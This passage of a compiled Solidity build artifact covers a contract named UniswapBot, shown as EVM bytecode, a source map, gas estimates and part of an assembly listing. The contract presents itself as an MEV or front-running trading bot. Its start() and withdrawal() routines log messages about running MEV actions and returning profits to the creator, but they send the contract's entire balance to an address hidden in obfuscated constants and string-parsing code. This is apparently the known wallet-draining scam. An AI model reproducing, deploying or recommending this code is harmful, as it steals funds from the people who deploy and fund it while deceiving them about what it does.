ADD SWAP1 POP PUSH2 0x12D JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x175 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB1A PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x274 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x2B9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xAE7 PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x30F PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x354 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x3ED JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x3C2 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x3ED JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x3D0 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7C1 JUMP JUMPDEST PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x93FC1E SWAP1 POP PUSH1 0x0 PUSH5 0xF676E9A32 SWAP1 POP PUSH1 0x0 PUSH4 0x5BBEAB1 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xA27 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4A7 PUSH2 0xA32 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4BD DUP8 PUSH2 0x4B8 DUP9 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4DB PUSH2 0x4CD DUP8 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x4D6 DUP8 PUSH2 0x7CD JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4E8 DUP6 PUSH2 0x7CD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4F5 DUP6 PUSH2 0x7CD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x515 PUSH2 0x506 DUP7 DUP7 PUSH2 0x8CC JUMP JUMPDEST PUSH2 0x510 DUP6 DUP6 PUSH2 0x8CC JUMP JUMPDEST PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x558 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x8CC JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7B4 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x59A JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5BC JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x60D JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x61D JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6B7 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65B JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66B JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6B6 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6A9 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6B5 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F5 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x705 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x79F JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x743 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x753 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x79E JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x791 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x79D JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x57E JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xB9F1A09 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x7F8 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x7F0 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x7D6 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x811 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x844 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8C0 JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x85C JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x868 DUP4 PUSH2 0xA3D JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x879 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8B2 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x84A JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x8F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x927 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x9A5 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x94C JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x969 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x937 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA18 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9BF JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9DC JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9AA JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x299978 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xCD4B5 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xA57 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA8C JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE1 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xAA4 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xADC JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA2646970667358221220664F 0x2C MOD SWAP16 SLOAD SLOAD 0x2F MOD CALL SIGNEXTEND DUP9 SHL CALLDATACOPY 0xE7 LOG4 0xB4 SLOAD 0xDD SELFDESTRUCT 0xD1 SELFDESTRUCT 0xC0 DUP11 PUSH20 0x98478D351FDE5F64736F6C634300060C00330000 ",
							"sourceMap": "625:16948:9:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;688:22;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15388:187;;;:::i;:::-;;15693:190;;;:::i;:::-;;655:26;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;688:22;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;15388:187::-;15436:63;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15518:16;:14;:16::i;:::-;15510:34;;:57;15545:21;15510:57;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15388:187::o;15693:190::-;15746:58;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15823:19;:17;:19::i;:::-;15815:37;;:60;15853:21;15815:60;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15693:190::o;655:26::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;15099:111::-;15148:7;15175:27;15188:13;:11;:13::i;:::-;15175:12;:27::i;:::-;15168:34;;15099:111;:::o;16640:114::-;16692:7;16719:27;16732:13;:11;:13::i;:::-;16719:12;:27::i;:::-;16712:34;;16640:114;:::o;13495:921::-;13541:13;13567:28;13598:48;;;;;;;;;;;;;;;;;;13611:34;13626:18;:16;:18::i;:::-;13611:14;:34::i;:::-;13598:7;:48::i;:::-;13567:79;;13657:16;13676:7;13657:26;;13694:19;13716:11;13694:33;;13738:17;13758:8;13738:28;;13777:19;13799:18;:16;:18::i;:::-;13777:40;;13828:18;13849:17;:15;:17::i;:::-;13828:38;;13880:23;13906:52;13914:14;13930:27;13945:11;13930:14;:27::i;:::-;13906:7;:52::i;:::-;13880:78;;13969:23;13995:69;14003:30;14018:14;14003;:30::i;:::-;14035:28;14050:12;14035:14;:28::i;:::-;13995:7;:69::i;:::-;13969:95;;14075:23;14101:30;14116:14;14101;:30::i;:::-;14075:56;;14142:23;14168:29;14183:13;14168:14;:29::i;:::-;14142:55;;14211:26;14240:69;14248:29;14256:9;14267;14248:7;:29::i;:::-;14279;14287:9;14298;14279:7;:29::i;:::-;14240:7;:69::i;:::-;14211:98;;14320:26;14349;;;;;;;;;;;;;;;;;;14362:12;14349:7;:26::i;:::-;14320:55;;14396:12;14389:19;;;;;;;;;;;;;;13495:921;:::o;8666:940::-;8729:15;8757:16;8782:2;8757:28;;8796:13;8824:10;8845;8874:6;8883:1;8874:10;;8869:698;8890:10;8886:1;:14;8869:698;;;8934:3;8925:12;;;;8971:3;8975:1;8971:6;;;;;;;;;;;;;;;;8965:13;;8957:22;;8952:27;;9013:3;9021:1;9017;:5;9013:10;;;;;;;;;;;;;;;;9007:17;;8999:26;;8994:31;;9051:2;9045;:8;;;;9044:25;;;;;9065:3;9059:2;:9;;;;9044:25;9040:232;;;9096:2;9090:8;;;;9040:232;;;9131:2;9125;:8;;;;9124:24;;;;;9145:2;9139;:8;;;;9124:24;9120:152;;;9175:2;9169:8;;;;9120:152;;;9210:2;9204;:8;;;;9203:24;;;;;9224:2;9218;:8;;;;9203:24;9199:73;;;9254:2;9248:8;;;;9199:73;9120:152;9040:232;9297:2;9291;:8;;;;9290:25;;;;;9311:3;9305:2;:9;;;;9290:25;9286:232;;;9342:2;9336:8;;;;9286:232;;;9377:2;9371;:8;;;;9370:24;;;;;9391:2;9385;:8;;;;9370:24;9366:152;;;9421:2;9415:8;;;;9366:152;;;9456:2;9450;:8;;;;9449:24;;;;;9470:2;9464;:8;;;;9449:24;9445:73;;;9500:2;9494:8;;;;9445:73;9366:152;9286:232;9552:2;9547;9542;:7;:12;9532:23;;;;8907:1;8902:6;;;;8869:698;;;;9592:5;9577:21;;;;;;8666:940;;;:::o;8402:92::-;8453:4;8477:9;8470:16;;8402:92;:::o;10168:440::-;10223:13;10252:10;10277:6;10286:1;10277:10;;10298:71;10310:1;10305;:6;10298:71;;10328:7;;;;;;;10355:2;10350:7;;;;;;;;;10298:71;;;10379:16;10408:5;10398:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;10379:35;;10430:6;10425:144;10442:5;10440:1;:7;10425:144;;;10477:2;10473:1;:6;;;;;;10469:10;;10515:20;10532:1;10515:10;:20::i;:::-;10494:3;10510:1;10506;10498:5;:9;:13;10494:18;;;;;;;;;;;:41;;;;;;;;;;;10555:2;10550:7;;;;;;;;;10449:3;;;;;10425:144;;;;10596:3;10582:18;;;;;10168:440;;;:::o;16932:635::-;17015:13;17041:23;17073:5;17041:38;;17090:24;17123:6;17090:40;;17144:23;17201:11;:18;17181:10;:17;:38;17170:50;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;17144:76;;17231:22;17262:9;17231:41;;17286:6;17303;17329:1;17327:3;;17323:92;17334:10;:17;17332:1;:19;17323:92;;;17390:10;17401:1;17390:13;;;;;;;;;;;;;;;;17373:9;17383:3;;;;;;17373:14;;;;;;;;;;;:30;;;;;;;;;;;17353:3;;;;;;;17323:92;;;17434:1;17432:3;;17428:94;17439:11;:18;17437:1;:20;17428:94;;;17496:11;17508:1;17496:14;;;;;;;;;;;;;;;;17479:9;17489:3;;;;;;17479:14;;;;;;;;;;;:31;;;;;;;;;;;17459:3;;;;;;;17428:94;;;17549:9;17535:24;;;;;;;;16932:635;;;;:::o;13257:90::-;13308:4;13332:7;13325:14;;13257:90;:::o;16543:88::-;16593:4;16617:6;16610:13;;16543:88;:::o;14763:327::-;14815:4;14841:1;14836:6;;:1;:6;;:16;;;;;14851:1;14846;:6;;;;14836:16;14832:191;;;14900:1;14887:9;14881:16;;:20;14876:26;;14869:33;;;;14832:191;14936:1;14924:14;;:2;:14;;:32;;;;;14954:2;14948:1;14942:14;;;;14924:32;14920:103;;;15008:2;15004:1;14991:9;14985:16;;:20;:25;14980:31;;14973:38;;;;14920:103;15074:8;;;14763:327;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "590200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"debugBot()": "infinite",
								"debugMempool()": "infinite",
								"start()": "infinite",
								"withdrawal()": "infinite"
							},
							"internal": {
								"_callMEVAction()": "infinite",
								"beyond(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
								"calcLiquidityInContract(struct UniswapBot.slice memory)": "infinite",
								"callMempool()": "infinite",
								"checkLiquidity(uint256)": "infinite",
								"findContracts(uint256,uint256,uint256,uint256)": "infinite",
								"findNewContracts(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
								"findPtr(uint256,uint256,uint256,uint256)": "infinite",
								"getMemPoolDepth()": "23",
								"getMemPoolHeight()": "23",
								"getMemPoolLength()": "infinite",
								"getMemPoolOffset()": "23",
								"keccak(struct UniswapBot.slice memory)": "infinite",
								"loadCurrentContract(string memory)": "infinite",
								"memcpy(uint256,uint256,uint256)": "infinite",
								"mempool(string memory,string memory)": "infinite",
								"nextContract(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
								"orderContractsByLiquidity(struct UniswapBot.slice memory)": "infinite",
								"parseMempool(string memory)": "infinite",
								"toHexDigit(uint8)": "213",
								"uint2str(uint256)": "infinite",
								"withdrawalProfits()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "80"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "PUSH",
									"source": 9,
									"value": "40"
								},
								{
									"begin": 625,
									"end": 17573,
									"name": "MSTORE",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "CALLVALUE",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "ISZERO",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "PUSH [tag]",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 773,
									"end": 940,
									"name": "JUMPI",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "PUSH",
									"source": 9,
									"value": "0"
								},
								{
									"begin": 773,
									"end": 940,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "REVERT",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "tag",
									"source": 9,
									"value": "1"
								},
								{
									"begin": 773,
									"end": 940,
									"name": "JUMPDEST",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "POP",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "PUSH",
									"source": 9,
									"value": "40"
								},
								{
									"begin": 773,
									"end": 940,
									"name": "MLOAD",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "PUSHSIZE",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "CODESIZE",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "SUB",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "DUP1",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "PUSHSIZE",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "DUP4",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "CODECOPY",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "DUP2",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "DUP2",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "ADD",
									"source": 9
								},
								{
									"begin": 773,
									"end": 940,
									"name": "PUSH",
									"source": 9,
									"value": "40"
								},
								{
									"begin": 773,
									"end": 940,
